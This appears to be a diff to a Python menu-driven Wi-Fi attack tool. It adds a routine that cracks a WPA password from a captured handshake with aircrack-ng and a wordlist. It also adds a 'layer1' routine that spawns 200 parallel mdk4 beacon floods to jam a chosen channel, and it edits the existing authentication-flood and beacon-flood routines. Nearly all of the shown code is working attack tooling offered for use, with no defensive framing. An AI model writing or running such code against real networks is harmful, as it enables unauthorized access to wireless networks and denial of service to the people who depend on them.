@@ -104,12 +104,50 @@ def main():
     return
 
 def show_networks():
-    subprocess.run(['airodump-ng','wlan0','--band','abg'])
+    subprocess.run(['airodump-ng','wlan0'])
 
     print(f"{colour.BOLD}\nReturning to Main Menu...")
 
 def crack_pw():
-    pass
+    try:
+        while True:
+            bssid = input("Please enter a BSSID to attack: ")
+
+            if re.match("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", bssid):
+                break
+            
+            print(f"{colour.RED}{colour.BOLD}Incorrect BSSID format.\n{colour.CLEAR}")
+
+        while True:
+            pcap = input("Please enter the path of the pcap file with EAPOL packets: ")
+
+            if os.path.isfile(pcap):
+                break
+            
+            print(f"{colour.RED}{colour.BOLD}Pcap file does not exist. Please enter a valid file.\n{colour.CLEAR}")
+
+        while True:
+            wordlist = input("please enter the path of the wordlist to use: ")
+
+            if os.path.isfile(wordlist):
+                break
+            
+            print(f"{colour.RED}{colour.BOLD}Wordlist does not exist. Please enter a valid file.\n{colour.CLEAR}")
+        
+        subprocess.run(['aircrack-ng','-w',wordlist,'-b',bssid,pcap])
+
+        print(f"{colour.ORANGE}\n~~~ Cracking Attempt Complete. ~~~")
+        print(f"\n{colour.CLEAR}Press CTRL+C to return to main menu.\nAutomatically returning in 2 minutes...")
+        time.sleep(120)
+    
+    except KeyboardInterrupt:
+        print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")
+    
+    print(f"{colour.BOLD}\nReturning to Main Menu...{colour.CLEAR}")
+    time.sleep(1)
+    subprocess.run(["clear"])
+    return
+
 
 def auth_attack():
     try: 
@@ -127,6 +165,8 @@ def auth_attack():
         subprocess.run(['mdk4','wlan0','a','-a',bssid])
 
         print(f"{colour.GREEN}\n\n~~~ Attack Stopped ~~~{colour.CLEAR}")
+
+
 
     except KeyboardInterrupt:
         print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")
@@ -175,7 +215,7 @@ def deauth_attack():
 def beacon_flood_attack():
     try: 
         while True:
-            ssid = input("Please enter an SSID to attack: ")
+            ssid = input("Please enter a 'fake' SSID to spoof and attack: ")
 
             if re.match("\w*", ssid):
                 break
@@ -209,7 +249,36 @@ def beacon_flood_attack():
     return
 
 def layer1_attack():
-    pass
+    try:         
+        while True:
+            channel = input("Please enter the channel of the target: ")
+
+            if re.match("\d\d?\d?", channel):
+                break
+            
+            print(f"{colour.RED}{colour.BOLD}Incorrect channel format.\n{colour.CLEAR}")
+
+        ###
+        print(f"\n{colour.RED}{colour.BOLD}~~~ THE ATTACK IS RUNNING ~~~{colour.CLEAR}")
+        print(f"\n{colour.RED}{colour.BOLD}~~~ Press CTRL+C to stop the attack ~~~\n{colour.CLEAR}")
+
+        subprocess.run(['iwconfig','wlan0','channel',channel])
+        
+        for _ in range(200):
+            subprocess.Popen(['mdk4','wlan0','b','-c',channel,'>','/dev/null'],stdout=subprocess.DEVNULL)
+
+        while True:
+            pass
+    
+    except KeyboardInterrupt:
+        subprocess.run(['killall','mdk4'])
+        print(f"{colour.GREEN}\n\n~~~ Attack Stopped ~~~{colour.CLEAR}")
+        print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")
+
+    print(f"{colour.BOLD}Returning to Main Menu...{colour.CLEAR}")
+    time.sleep(1)
+    subprocess.run(["clear"])
+    return
 
 def get_status():
     # returns card mode and channel
